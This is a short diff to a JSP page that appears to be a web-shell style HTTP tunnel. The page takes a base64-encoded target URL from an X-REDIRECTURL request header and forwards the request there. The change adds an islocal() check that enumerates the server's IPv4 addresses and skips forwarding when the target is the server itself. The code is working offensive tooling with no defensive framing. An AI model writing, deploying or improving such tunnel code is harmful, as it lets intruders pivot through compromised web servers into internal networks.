@@ -166,13 +166,31 @@
         }
         return out.substring(0, out.length() - 1);
     }
+
+    boolean islocal(String url) throws Exception {
+        String ip = (new URL(url)).getHost();
+        Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
+        while (nifs.hasMoreElements()) {
+            NetworkInterface nif = nifs.nextElement();
+            Enumeration<InetAddress> addresses = nif.getInetAddresses();
+            while (addresses.hasMoreElements()) {
+                InetAddress addr = addresses.nextElement();
+                if (addr instanceof Inet4Address)
+                    if (addr.getHostAddress().equals(ip))
+                        return true;
+            }
+        }
+        return false;
+    }
 ]]></jsp:declaration>
 <jsp:scriptlet><![CDATA[
     String rUrl = request.getHeader("X-REDIRECTURL");
     if (rUrl != null) {
         rUrl = new String(b64de(rUrl));
-        redirectRequest("X-REDIRECTURL", rUrl, request, response);
-        if ( true ) return; // exit
+        if (!islocal(rUrl)){
+            redirectRequest("X-REDIRECTURL", rUrl, request, response);
+            if ( true ) return; // exit
+        }
     }
 
     response.resetBuffer();
